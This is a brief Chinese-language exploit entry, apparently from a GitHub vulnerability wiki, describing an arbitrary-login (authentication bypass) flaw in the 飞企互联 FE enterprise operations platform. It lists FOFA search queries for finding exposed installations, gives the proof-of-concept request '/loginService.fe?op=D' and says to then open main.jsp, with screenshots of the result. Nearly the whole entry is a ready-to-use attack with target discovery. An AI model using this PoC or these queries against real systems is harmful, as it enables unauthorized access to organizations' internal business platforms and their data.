## ⻜企互联loginService任意登录

## fofa
```
app="FE-协作平台"
app="飞企互联-FE企业运营管理平台"
```

## poc
```
/loginService.fe?op=D
```
![image](https://github.com/wy876/wiki/assets/139549762/24586559-ad1b-4348-8f07-c4449947baf9)

接着访问main.jsp
![image](https://github.com/wy876/wiki/assets/139549762/79c46531-5504-448f-a489-7804934da083)
